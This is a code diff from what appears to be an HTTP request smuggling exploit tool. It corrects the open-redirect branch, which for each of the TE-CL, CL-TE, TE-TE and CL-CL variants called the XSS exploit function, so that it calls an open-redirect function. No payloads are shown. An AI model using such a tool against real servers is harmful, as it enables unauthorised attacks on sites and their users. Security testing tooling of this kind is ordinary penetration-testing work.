@@ -449,16 +449,16 @@ def exploit_openredirect():
         if "EXPLOIT-5" in exp: # extract exploit-5 (open-redirect)
             if request_type == "TE-CL":
                 if "TE-CL" in exp: # exploit 5 TE-CL
-                    exploit_xss_armed(method, path, target, location, content_length, exp, addr, SSL)
+                    exploit_openredirect_armed(method, path, target, location, content_length, exp, addr, SSL)
             elif request_type == "CL-TE":
                 if "CL-TE" in exp: # exploit 5 CL-TE
-                    exploit_xss_armed(method, path, target, location, content_length, exp, addr, SSL)
+                    exploit_openredirect_armed(method, path, target, location, content_length, exp, addr, SSL)
             elif request_type == "TE-TE":
                 if "TE-TE" in exp: # exploit 5 TE-TE
-                    exploit_xss_armed(method, path, target, location, content_length, exp, addr, SSL)
+                    exploit_openredirect_armed(method, path, target, location, content_length, exp, addr, SSL)
             elif request_type == "CL-CL":
                 if "CL-CL" in exp: # exploit 5 CL-CL
-                    exploit_xss_armed(method, path, target, location, content_length, exp, addr, SSL)
+                    exploit_openredirect_armed(method, path, target, location, content_length, exp, addr, SSL)
             else: # send all!
                 exploit = exp.split("#")[1]
                 exploit = exploit.replace("$method", method)
